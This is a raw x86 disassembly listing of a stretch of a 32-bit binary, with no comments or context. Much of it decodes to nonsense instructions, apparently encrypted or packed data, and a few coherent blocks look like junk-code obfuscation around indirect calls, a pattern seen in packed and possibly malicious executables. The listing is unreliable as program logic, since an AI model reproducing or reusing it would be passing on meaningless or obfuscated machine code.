  402aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af0:	jbe    0x402afd
  402af2:	mov    ah,BYTE PTR [eax]
  402af4:	add    edi,DWORD PTR [eax+0x38dc8053]
  402afa:	jmp    0x402ad5
  402afc:	or     eax,0x92c693e5
  402b01:	and    ebx,0xffffffc1
  402b04:	outs   dx,DWORD PTR ds:[esi]
  402b05:	ret    0xdc02
  402b08:	fs cdq 
  402b0a:	pop    es
  402b0b:	push   ebx
  402b0c:	imul   esp,eax,0x4a1f596a
  402b12:	add    eax,0x10b295e4
  402b17:	not    BYTE PTR [edi]
  402b19:	push   ecx
  402b1a:	mov    ds:0x8a6170a7,eax
  402b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b20:	aas    
  402b21:	pop    eax
  402b22:	jp     0x402b9a
  402b24:	loope  0x402ad6
  402b26:	sahf   
  402b27:	imul   ebx,DWORD PTR ds:0x6f3dc6cc,0x9ad7892e
  402b31:	stc    
  402b32:	shl    BYTE PTR ds:0xb69af06e,cl
  402b38:	ins    BYTE PTR es:[edi],dx
  402b39:	outs   dx,DWORD PTR ds:[esi]
  402b3a:	cmp    edx,DWORD PTR [ebx+0x53]
  402b3d:	pop    esi
  402b3e:	and    edx,ebp
  402b40:	arpl   WORD PTR [edx-0x69934344],sp
  402b46:	enter  0x9bae,0x20
  402b4a:	dec    ecx
  402b4b:	iret   
  402b4c:	adc    DWORD PTR [esi+eiz*1+0x1b],ebp
  402b50:	lds    esp,FWORD PTR [edi-0x5d]
  402b53:	dec    edx
  402b54:	(bad)  
  402b55:	and    DWORD PTR [ecx+0x6d],esi
  402b58:	push   esp
  402b59:	inc    ecx
  402b5a:	in     eax,dx
  402b5b:	ret    0x1b37
  402b5e:	in     eax,dx
  402b5f:	xchg   ecx,eax
  402b60:	sbb    eax,0x976abde1
  402b65:	dec    esp
  402b66:	jno    0x402b36
  402b68:	les    ebx,FWORD PTR [edi-0x2097afaf]
  402b6e:	or     eax,0x1d810000
  402b73:	ja     0x402af8
  402b75:	inc    edx
  402b76:	add    al,ah
  402b78:	inc    ecx
  402b79:	add    BYTE PTR [eax],al
  402b7b:	push   0x2d0f
  402b80:	call   0x422049
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428263,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428377
  402b9a:	mov    DWORD PTR ds:0x42816f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428213
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x4282eb,ebx
  402bb6:	cmp    DWORD PTR ds:0x428263,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d64
  402bcc:	mov    edx,DWORD PTR ds:0x428273
  402bd2:	add    DWORD PTR ds:0x42824b,edx
  402bd8:	mov    DWORD PTR ds:0x4282ef,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42822b
  402be8:	mov    edx,DWORD PTR ds:0x4282fb
  402bee:	sbb    DWORD PTR ds:0x428287,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428243
  402bfa:	xor    DWORD PTR ds:0x428307,edx
  402c00:	and    edx,DWORD PTR ds:0x4282df
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42820b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x4281b3
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42823b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422568
  402c34:	or     DWORD PTR ds:0x428133,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282db,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42836f,0x42834b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [esi+eax*1+0x22],0x55
  402c79:	stos   BYTE PTR es:[edi],al
  402c7a:	mov    dh,0xf4
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [ecx],cl
  402c83:	xor    eax,0x3bd927ff
  402c88:	mov    ah,0x50
  402c8a:	gs pusha 
  402c8c:	and    ebp,DWORD PTR [ebx]
  402c8e:	mov    esp,0x7d71c64b
  402c93:	jnp    0x402c99
  402c95:	repnz fist DWORD PTR [edi]
  402c98:	shr    DWORD PTR [ecx-0x6b],0xc9
  402c9c:	scas   al,BYTE PTR es:[edi]
  402c9d:	pusha  
  402c9e:	sub    ebp,ecx
  402ca0:	mov    edi,0xf43623a4
  402ca5:	sub    eax,esp
  402ca7:	std    
  402ca8:	std    
  402ca9:	push   0xffffffc0
  402cab:	adc    eax,0x1cbcc7e0
  402cb0:	(bad)  
  402cb1:	mov    bl,0x81
  402cb3:	div    bl
  402cb5:	jecxz  0x402c78
  402cb7:	cmp    eax,esi
  402cb9:	pcmpeqw mm0,QWORD PTR [ebx-0x212fccbe]
  402cc0:	sahf   
  402cc1:	mov    ebp,0xf905565e
  402cc6:	jae    0x402ce0
  402cc8:	pushf  
  402cc9:	mov    ds:0x186e7fe7,al
  402cce:	aad    0x49
  402cd0:	stos   BYTE PTR es:[edi],al
  402cd1:	stos   DWORD PTR es:[edi],eax
  402cd2:	jecxz  0x402cc6
  402cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd5:	xor    BYTE PTR [esi+esi*8],al
  402cd8:	pop    edi
  402cd9:	cmc    
  402cda:	mov    ecx,0x3456d58a
  402cdf:	icebp  
  402ce0:	into   
  402ce1:	sub    esi,ebx
  402ce3:	pop    ds
  402ce4:	or     cl,BYTE PTR [eax+0x4f4241b3]
  402cea:	mov    bl,0x61
  402cec:	lods   al,BYTE PTR ds:[esi]
  402ced:	dec    eax
  402cee:	ja     0x402cd9
  402cf0:	pop    ds
  402cf1:	mov    dh,0xb8
  402cf3:	mov    ds:0xb4eb219f,al
  402cf8:	push   cs
  402cf9:	and    al,0x96
  402cfb:	xchg   edi,eax
  402cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cfd:	fnstsw WORD PTR [eax]
  402cff:	retf   
  402d00:	push   esi
  402d01:	das    
  402d02:	xor    ch,bh
  402d04:	bound  edx,QWORD PTR [esi+0x70]
  402d07:	out    0x96,eax
  402d09:	in     eax,dx
  402d0a:	in     eax,dx
  402d0b:	(bad)  
  402d0c:	jns    0x402d84
  402d0e:	mov    es,WORD PTR [esi+0x54bb9a64]
  402d14:	mov    bh,BYTE PTR [edi+0x4c61b20c]
  402d1a:	mov    ebp,0x1ffa295d
  402d1f:	add    eax,0x5567297c
  402d24:	pushf  
  402d25:	push   0x93f4206e
  402d2a:	inc    ebx
  402d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2c:	pop    ebx
  402d2d:	cmp    DWORD PTR [ebx],ecx
  402d2f:	mov    al,ds:0x3e367912
  402d34:	fidivr WORD PTR [edi+0x12b577a9]
  402d3a:	not    BYTE PTR [esi]
  402d3c:	sbb    dl,BYTE PTR [ecx+0x65]
  402d3f:	ret    0x4502
  402d42:	mov    ebp,0xb4ff5ab
  402d47:	push   edx
  402d48:	fsubrp st(3),st
  402d4a:	mov    esi,DWORD PTR [ebx-0x5c]
  402d4d:	iret   
  402d4e:	push   ecx
  402d4f:	clc    
  402d50:	xchg   esp,eax
  402d51:	cli    
  402d52:	xor    DWORD PTR [edi-0x364353ef],edx
  402d58:	adc    BYTE PTR [ecx],bl
  402d5a:	fcmovnbe st,st(1)
  402d5c:	imul   si,WORD PTR [esi+0x16],0xfff3
  402d61:	jns    0x402d38
  402d63:	jns    0x402dc3
  402d65:	jne    0x402d1c
  402d67:	xchg   DWORD PTR [edx-0x73d188bb],ecx
  402d6d:	mov    bl,0x0
  402d6f:	rcl    bh,1
  402d71:	pop    DWORD PTR [edi]
  402d73:	shl    dl,0x36
  402d76:	retf   0xfa5
  402d79:	pushf  
  402d7a:	lods   eax,DWORD PTR ds:[esi]
  402d7b:	or     ecx,eax
  402d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7e:	or     bl,BYTE PTR [ecx+0x41ce2017]
  402d84:	std    
  402d85:	sti    
  402d86:	in     eax,dx
  402d87:	mov    edi,0x4446b359
  402d8c:	out    dx,eax
  402d8d:	dec    eax
  402d8e:	mov    al,0xe1
  402d90:	cli    
  402d91:	inc    esi
  402d92:	sbb    eax,ebx
  402d94:	pop    ss
  402d95:	mov    ah,0xe
  402d97:	loopne 0x402d8b
  402d99:	ret    
  402d9a:	arpl   WORD PTR [esp+ebp*8+0x2d],dx
  402d9e:	adc    al,0xfd
  402da0:	mov    es,WORD PTR [ecx+0x12df9f11]
  402da6:	cwde   
  402da7:	or     DWORD PTR [ebx],edx
  402da9:	jmp    0x402d84
  402dab:	mov    BYTE PTR [ebp+0x6a26f6f6],al
  402db1:	or     BYTE PTR [ecx],bh
  402db3:	lahf   
  402db4:	xor    BYTE PTR [edx-0x2f],0xd2
  402db8:	pop    esp
  402db9:	cmp    edi,ecx
  402dbb:	sub    eax,0xef1ea3b8
  402dc0:	xor    DWORD PTR [eax-0x39f5ed3d],edx
  402dc6:	xor    al,0x1f
  402dc8:	xchg   BYTE PTR [ebx],bl
  402dca:	lock sbb eax,0x88ca77fc
  402dd0:	jecxz  0x402dd1
  402dd2:	out    0x75,eax
  402dd4:	jne    0x402e4a
  402dd6:	jecxz  0x402d6a
  402dd8:	in     al,dx
  402dd9:	cmp    bl,BYTE PTR [esi+0x7fd507a6]
  402ddf:	(bad)  
  402de0:	jmp    0x6596:0xe1c6cd69
  402de7:	xchg   edx,eax
  402de8:	mov    al,0xf
  402dea:	pop    ss
  402deb:	call   0x8ad7:0x248759f4
  402df2:	add    DWORD PTR [esi],edi
  402df4:	loopne 0x402e54
  402df6:	aam    0x2c
  402df8:	sahf   
  402df9:	cli    
  402dfa:	mov    esi,0x141e241e
  402dff:	sub    ebx,DWORD PTR [ecx-0x257226ce]
  402e05:	repz cmp al,0x77
  402e08:	jne    0x402e67
  402e0a:	cmc    
  402e0b:	fist   WORD PTR [esp+eiz*2+0x3f269776]
  402e12:	mov    eax,0xeae35e94
  402e17:	or     ecx,ebx
  402e19:	and    eax,0xe304b29e
  402e1e:	adc    al,BYTE PTR [ebp-0x3edf666d]
  402e24:	or     al,0xa0
  402e26:	mov    al,ds:0x80d64529
  402e2b:	ins    DWORD PTR es:[edi],dx
  402e2c:	arpl   cx,ax
  402e2e:	clc    
  402e2f:	aaa    
  402e30:	cli    
  402e31:	cmp    DWORD PTR [ecx+0x226edea2],eax
  402e37:	xlat   BYTE PTR ds:[ebx]
  402e38:	add    DWORD PTR [edi+edi*8+0x7b23051f],esp
  402e3f:	lock sbb ah,BYTE PTR [edx]
  402e42:	pushf  
  402e43:	in     eax,0x67
  402e45:	sub    DWORD PTR [esi],edx
  402e47:	jnp    0x402dde
  402e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e4a:	out    dx,al
  402e4b:	gs push esi
  402e4d:	pop    ds
  402e4e:	test   DWORD PTR [esp+ebp*1-0xa0a1571],ebx
  402e55:	pop    eax
  402e56:	pop    edi
  402e57:	pop    ebx
  402e58:	aam    0xcd
  402e5a:	mov    esi,0x5dc6424d
  402e5f:	inc    ebp
  402e60:	ja     0x402eb4
  402e62:	push   esi
  402e63:	mov    edx,0xfe69e620
  402e68:	add    DWORD PTR [edx],edi
  402e6a:	int3   
  402e6b:	cmp    DWORD PTR [ebx],ebp
  402e6d:	(bad)  
  402e6e:	lods   al,BYTE PTR ds:[esi]
  402e6f:	loop   0x402e45
  402e71:	sbb    BYTE PTR ds:0x651c718a,bl
  402e77:	fwait
  402e78:	ja     0x402e51
  402e7a:	addr16 sahf 
  402e7c:	ror    ah,1
  402e7e:	jle    0x402eb5
  402e80:	pop    ss
  402e81:	std    
  402e82:	loope  0x402ed5
  402e84:	pop    eax
  402e85:	leave  
  402e86:	jns    0x402ee2
  402e88:	push   ebx
  402e89:	cmp    eax,ecx
  402e8b:	ins    BYTE PTR es:[edi],dx
  402e8c:	sbb    ah,BYTE PTR [edx-0x7d]
  402e8f:	add    eax,0x6cc4b74b
  402e94:	(bad)  
  402e95:	and    dh,bh
  402e97:	fucomip st,st(1)
  402e99:	outs   dx,DWORD PTR gs:[esi]
  402e9b:	push   esi
  402e9c:	add    DWORD PTR [ecx-0x7ad76c9],0xfffffffe
  402ea3:	add    esp,DWORD PTR [edi+0x4a]
  402ea6:	fist   WORD PTR [ecx]
  402ea8:	dec    esi
  402ea9:	loope  0x402ea1
  402eab:	sar    BYTE PTR [eax+0xac02922],cl
  402eb1:	fistp  QWORD PTR [ecx+0x24]
  402eb4:	xchg   ecx,eax
  402eb5:	shr    BYTE PTR [edi-0x13],0xdf
  402eb9:	or     eax,0x83c9d81c
  402ebe:	mov    cl,0xea
  402ec0:	(bad)  
  402ec1:	outs   dx,DWORD PTR ds:[esi]
  402ec2:	jne    0x402e8f
  402ec4:	or     DWORD PTR [ebx],ebp
  402ec6:	inc    eax
  402ec7:	stos   BYTE PTR es:[edi],al
  402ec8:	jns    0x402f08
  402eca:	jge    0x402f47
  402ecc:	mov    al,0x1c
  402ece:	pop    eax
  402ecf:	sahf   
  402ed0:	cmp    al,0xf9
  402ed2:	push   ecx
  402ed3:	jns    0x402ee5
  402ed5:	and    eax,0x44fd4c33
  402eda:	outs   dx,BYTE PTR ds:[esi]
  402edb:	ss popa 
  402edd:	or     al,0x95
  402edf:	scas   al,BYTE PTR es:[edi]
  402ee0:	dec    esp
  402ee1:	scas   al,BYTE PTR es:[edi]
  402ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ee3:	out    dx,al
  402ee4:	and    BYTE PTR [edx-0x625943fb],dl
  402eea:	cmp    ebp,esp
  402eec:	test   eax,0x8ef94798
  402ef1:	imul   ebp,ebp,0xffffffe9
  402ef4:	xor    DWORD PTR [ecx],esp
  402ef6:	sub    bl,BYTE PTR [eax+edx*2-0x9f1a0b]
  402efd:	jmp    0x3a1c:0x34538ae7
  402f04:	je     0x402ee5
  402f06:	scas   al,BYTE PTR es:[edi]
  402f07:	jmp    0x402f6f
  402f09:	test   eax,0x584d8a8b
  402f0e:	pop    ss
  402f0f:	sti    
  402f10:	(bad)  
  402f11:	lods   eax,DWORD PTR ds:[esi]
  402f12:	jnp    0x402f6d
  402f14:	cld    
  402f15:	adc    BYTE PTR [eax],0x32
  402f18:	pop    es
  402f19:	pop    esi
  402f1a:	repnz pop edx
  402f1c:	sub    eax,0xf37e3a6b
  402f21:	les    eax,FWORD PTR [edx+esi*1-0x298e3fc2]
  402f28:	mov    ebp,0x8405fe03
  402f2d:	inc    ebx
  402f2e:	cld    
  402f2f:	scas   al,BYTE PTR es:[edi]
  402f30:	(bad)  
  402f31:	ins    DWORD PTR es:[edi],dx
  402f32:	or     eax,0xe0e05ae9
  402f37:	cwde   
  402f38:	(bad)  
  402f39:	std    
  402f3a:	mov    esi,0x71255834
  402f3f:	repz icebp 
  402f41:	mov    bl,0x35
  402f43:	mov    DWORD PTR [esi+0x22],eax
  402f46:	jmp    DWORD PTR [eax-0x583165b8]
  402f4c:	adc    ah,bl
  402f4e:	das    
  402f4f:	repnz or eax,0xb6397900
  402f55:	pop    esi
  402f56:	gs and al,0xd8
  402f59:	add    BYTE PTR [ebp+0x5ac64d74],ah
  402f5f:	ret    0xab2a
  402f62:	mov    cl,0xbb
  402f64:	and    bh,BYTE PTR [ecx-0x80]
  402f67:	mov    bh,al
  402f69:	mov    al,0xcf
  402f6b:	sbb    ebp,edx
  402f6d:	js     0x402f01
  402f6f:	pop    edi
  402f70:	outs   dx,BYTE PTR ds:[esi]
  402f71:	pop    ebp
  402f72:	jno    0x402f56
  402f74:	mov    ecx,DWORD PTR [eax-0xf2cf969]
  402f7a:	outs   dx,DWORD PTR ds:[esi]
  402f7b:	sbb    ch,BYTE PTR [edx-0x1a]
  402f7e:	and    eax,0x1b8d043f
  402f83:	push   0x6bbfdbfc
  402f88:	lds    esi,FWORD PTR [ebp+ebx*1+0x3446e4db]
  402f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f90:	sbb    BYTE PTR [edi-0x181d7a41],0x2c
  402f97:	push   ecx
  402f98:	jg     0x402fb7
  402f9a:	xchg   edx,eax
  402f9b:	sbb    ebx,eax
  402f9d:	jns    0x402fff
  402f9f:	cmp    BYTE PTR [edx-0x7515f783],ch
  402fa5:	pop    ss
  402fa6:	sti    
  402fa7:	push   ecx
  402fa8:	ret    
  402fa9:	mov    ah,0x3f
  402fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fac:	lods   al,BYTE PTR ds:[esi]
  402fad:	add    ah,cl
  402faf:	in     al,dx
  402fb0:	mov    ds:0x42337fe6,al
  402fb5:	xor    eax,0x1518d653
  402fba:	out    dx,eax
  402fbb:	dec    edi
  402fbc:	gs adc al,0x46
  402fbf:	xchg   esp,eax
  402fc0:	xchg   ecx,eax
  402fc1:	rol    BYTE PTR [edi+0x2e],cl
  402fc4:	adc    DWORD PTR [edi-0x62a0d8da],eax
  402fca:	lds    esp,FWORD PTR [eax+ebp*2-0xa00d63]
  402fd1:	ins    DWORD PTR es:[edi],dx
  402fd2:	addr16 push 0x4e8a1e4c
  402fd8:	inc    esi
  402fd9:	in     eax,0x2c
  402fdb:	(bad)  
  402fdc:	cmp    eax,0xab65cd97
  402fe1:	mov    eax,ds:0x9d99a6a0
  402fe6:	adc    al,0xfa
  402fe8:	sahf   
  402fe9:	call   0xc7e8:0x3a45ca7
  402ff0:	pop    eax
  402ff1:	call   0x707d:0x28ed753a
  402ff8:	xor    al,0x3
  402ffa:	cmp    al,BYTE PTR [esi-0xf]
  402ffd:	add    BYTE PTR [edi],cl
  402fff:	push   ebp
  403000:	adc    bh,BYTE PTR [esi+0x1129e0b]
  403006:	xor    esi,ecx
  403008:	mov    ah,0x59
  40300a:	test   eax,0x3d805615
  40300f:	xchg   ecx,eax
  403010:	ret    0x7600
  403013:	rcl    DWORD PTR [ebp+0xf],1
  403016:	loopne 0x403090
  403018:	ror    DWORD PTR [ebx],1
  40301a:	fnstenv [edi+0x5ace7442]
  403020:	xchg   DWORD PTR [esp+edx*2+0x27],ecx
  403024:	inc    edi
  403025:	xor    eax,0xc6dea6c6
  40302a:	xchg   ebp,eax
  40302b:	pop    es
  40302c:	xchg   edi,eax
  40302d:	add    ebx,0x1cf51199
  403033:	stc    
  403034:	lds    ebp,FWORD PTR [ecx+0x4136241]
  40303a:	xchg   ebx,eax
  40303b:	sbb    DWORD PTR [eax+0x13],edx
  40303e:	bndldx (bad),[ebx-0x35dcbdf9]
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42827b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42837f,0x0
  403071:	mov    DWORD PTR ds:0x428383,edx
  403077:	mov    DWORD PTR ds:0x4282cb,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428373
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42813f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42837f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428d84
  4030b1:	mov    DWORD PTR ds:0x42822b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42824f
  4030c1:	or     edx,DWORD PTR ds:0x4282eb
  4030c7:	add    edx,DWORD PTR ds:0x42816f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428377,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x4282ff
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428363
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x428383,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42813b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x428387,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x403150
  403121:	test   ebx,ebp
  403123:	mov    esi,0x1818ec3d
  403128:	sahf   
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [ecx],ch
  40312d:	stos   BYTE PTR es:[edi],al
  40312e:	arpl   ax,di
  403130:	in     eax,0x7b
  403132:	adc    DWORD PTR [ebx+ecx*1-0x2ce2f778],0xf480f49c
  40313d:	xchg   edx,eax
  40313e:	or     ch,BYTE PTR [edi-0x6f7ac7c9]
  403144:	dec    ebp
  403145:	cmp    DWORD PTR [ebx],ecx
  403147:	sub    al,0x35
  403149:	pop    ebp
  40314a:	fmulp  st(6),st
  40314c:	fnstsw WORD PTR [edx-0x6b27b9da]
  403152:	xchg   ecx,eax
  403153:	scas   al,BYTE PTR es:[edi]
  403154:	push   esp
  403155:	scas   eax,DWORD PTR es:[edi]
  403156:	cs dec esp
  403158:	inc    edi
  403159:	pop    edx
  40315a:	out    dx,al
  40315b:	jo     0x403131
  40315d:	in     eax,dx
  40315e:	mov    eax,0x6b5b4dc8
  403163:	sub    ebp,edx
  403165:	cmc    
  403166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403167:	in     eax,dx
  403168:	dec    ebx
  403169:	dec    esp
  40316a:	inc    edi
  40316b:	add    al,0x11
  40316d:	or     edx,ebp
  40316f:	pop    esi
  403170:	dec    ebp
  403171:	inc    edx
  403172:	dec    esi
  403173:	adc    BYTE PTR ds:0x73ad3d1,ch
  403179:	and    esp,eax
  40317b:	xchg   esp,eax
  40317c:	push   ecx
  40317d:	ins    BYTE PTR es:[edi],dx
  40317e:	push   ss
  40317f:	loope  0x4031cb
  403181:	and    esi,DWORD PTR [edx+0x4c]
  403184:	jmp    0x9008:0xc360a71e
  40318b:	ins    BYTE PTR es:[edi],dx
  40318c:	push   edi
  40318d:	nop
  40318e:	adc    BYTE PTR [ecx-0x37],ch
  403191:	mov    esi,0x78996ce6
  403196:	or     eax,0x1f2d1b57
  40319b:	jo     0x403215
  40319d:	sbb    eax,DWORD PTR [edx+0x454e9d79]
  4031a3:	in     al,0xb4
  4031a5:	(bad)  
  4031a6:	push   ds
  4031a7:	js     0x4031e5
  4031a9:	adc    edi,DWORD PTR [edx-0x365d026a]
  4031af:	push   ds
  4031b0:	aas    
  4031b1:	lods   eax,DWORD PTR ds:[esi]
  4031b2:	(bad)  
  4031b3:	push   ss
  4031b4:	icebp  
  4031b5:	cmp    al,0x8b
  4031b7:	and    BYTE PTR [esi+0x37],0x65
  4031bb:	jns    0x4031b6
  4031bd:	test   eax,0x1937840
  4031c2:	and    al,0x29
  4031c4:	pop    ebx
  4031c5:	les    esp,FWORD PTR [ecx]
  4031c7:	mov    eax,0x81193980
  4031cc:	aas    
  4031cd:	mov    ecx,0x10a0e5f8
  4031d2:	ins    DWORD PTR es:[edi],dx
  4031d3:	(bad)  
  4031d4:	fsub   QWORD PTR [edi]
  4031d6:	cmp    DWORD PTR ds:0x69ee3d2c,edx
  4031dc:	dec    edx
  4031dd:	cmp    al,0xc8
  4031df:	ret    
  4031e0:	call   0x89b1f401
  4031e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e6:	ins    DWORD PTR es:[edi],dx
  4031e7:	mov    edx,DWORD PTR [eax-0x5]
  4031ea:	in     eax,dx
  4031eb:	lds    esi,FWORD PTR [ecx-0x7a]
  4031ee:	mov    esi,0xb7f965d8
  4031f3:	ret    
  4031f4:	hlt    
  4031f5:	es leave 
  4031f7:	xor    BYTE PTR [edx],0x88
  4031fa:	or     bl,BYTE PTR [esi+edi*2+0x1978c2f6]
  403201:	mov    bh,0x95
  403203:	mov    BYTE PTR [ebx-0x76d15852],bh
  403209:	aaa    
  40320a:	xchg   ebp,eax
  40320b:	inc    esp
  40320c:	mov    esi,0xea65cd98
  403211:	mov    al,0xb0
  403213:	xor    edi,DWORD PTR [ebx-0x6a]
  403216:	jo     0x40321f
  403218:	clc    
  403219:	je     0x403217
  40321b:	leave  
  40321c:	test   eax,0xb100b88c
  403221:	push   cs
  403222:	arpl   WORD PTR [ebp+ecx*2-0x11f7c4f1],bx
  403229:	mov    cl,BYTE PTR [edi]
  40322b:	jge    0x4031c5
  40322d:	out    dx,al
  40322e:	test   BYTE PTR [edx+0x55005bf7],cl
  403234:	addr16 sbb al,0x15
  403237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403238:	ja     0x403210
  40323a:	out    dx,al
  40323b:	lock ss mov edi,edi
  40323f:	mov    ebp,ecx
  403241:	and    esp,esp
  403243:	xchg   ebp,eax
  403244:	sbb    al,0xa
  403246:	dec    eax
  403247:	sbb    esp,DWORD PTR ds:0x7820a0c5
  40324d:	ds and al,0x50
  403250:	in     eax,0x6c
  403252:	and    ch,dh
  403254:	aad    0x37
  403256:	dec    ebp
  403257:	sub    al,0xda
  403259:	mov    ds:0x3605428e,al
  40325e:	out    0x2,eax
  403260:	mov    edi,edx
  403262:	jb     0x403257
  403264:	fcmovbe st,st(4)
  403266:	inc    edi
  403267:	popa   
  403268:	xchg   edx,eax
  403269:	ror    BYTE PTR [esi+0x41],0x97
  40326d:	mov    edx,0xc8639cbe
  403272:	xor    al,0x13
  403274:	clc    
  403275:	xchg   ebp,eax
  403276:	xor    eax,0x2174a0a2
  40327b:	xlat   BYTE PTR ds:[ebx]
  40327c:	add    cl,BYTE PTR [ecx+0x51fe153e]
  403282:	outs   dx,DWORD PTR ds:[esi]
  403283:	add    ah,ch
  403285:	stc    
  403286:	xchg   BYTE PTR [ebx],ch
  403288:	cmp    eax,0x888861ee
  40328d:	xchg   ecx,eax
  40328e:	inc    eax
  40328f:	and    ah,0x47
  403292:	loopne 0x40321f
  403294:	in     al,0x10
  403296:	or     BYTE PTR [ecx-0x5bfeb3e8],dl
  40329c:	mov    ds:0x6e5f7542,al
  4032a1:	cmp    ebx,esi
  4032a3:	push   ss
  4032a4:	sbb    esp,esi
  4032a6:	rcl    BYTE PTR [ebx+0x0],1
  4032a9:	mov    BYTE PTR [ebx+0x26],al
  4032ac:	cdq    
  4032ad:	call   DWORD PTR [ecx]
  4032af:	ins    BYTE PTR es:[edi],dx
  4032b0:	cs addr16 loop 0x403239
  4032b4:	dec    eax
  4032b5:	jge    0x403259
  4032b7:	cmp    BYTE PTR [edi+0x6123adb5],ch
  4032bd:	inc    ebp
  4032be:	jp     0x40330e
  4032c0:	sbb    BYTE PTR [ecx-0x1e0298b2],0x7c
  4032c7:	je     0x403267
  4032c9:	push   ecx
  4032ca:	cmp    DWORD PTR [esi+0x69afdc26],ecx
  4032d0:	sbb    al,0x50
  4032d2:	sub    DWORD PTR [esi],0x50
  4032d5:	xchg   ebp,eax
  4032d6:	pop    ecx
  4032d7:	loop   0x4032ad
  4032d9:	stos   BYTE PTR es:[edi],al
  4032da:	sbb    DWORD PTR [ecx+0x41],esi
  4032dd:	stc    
  4032de:	mov    ecx,0x65115ecc
  4032e3:	jmp    0x911d:0x5300ad2d
  4032ea:	jbe    0x4032bc
  4032ec:	clc    
  4032ed:	sub    BYTE PTR [esi+edi*2-0x45],al
  4032f1:	out    dx,al
  4032f2:	mov    esp,0xd0da6f48
  4032f7:	push   ebp
  4032f8:	mov    DWORD PTR [ecx],esp
  4032fa:	and    DWORD PTR [ebp+eiz*2-0x3999a386],esi
  403301:	loop   0x4032ea
  403303:	mov    esp,0xd235a718
  403308:	cs jle 0x4032ee
  40330b:	test   eax,0xb469e867
  403310:	out    dx,al
  403311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403312:	cmp    DWORD PTR [esi-0x61],0xa76e787f
  403319:	je     0x4032ba
  40331b:	icebp  
  40331c:	repz hlt 
  40331e:	daa    
  40331f:	xchg   ebp,eax
  403320:	cmp    DWORD PTR [ebp-0x595307a5],eax
  403326:	out    dx,al
  403327:	adc    eax,0xbb63286c
  40332c:	push   0xffffffdb
  40332e:	shl    DWORD PTR [ebx-0x471e323],cl
  403334:	retf   0x53ca
  403337:	add    al,0xb
  403339:	jb     0x403375
  40333b:	xor    BYTE PTR [edx],cl
  40333d:	xchg   edx,eax
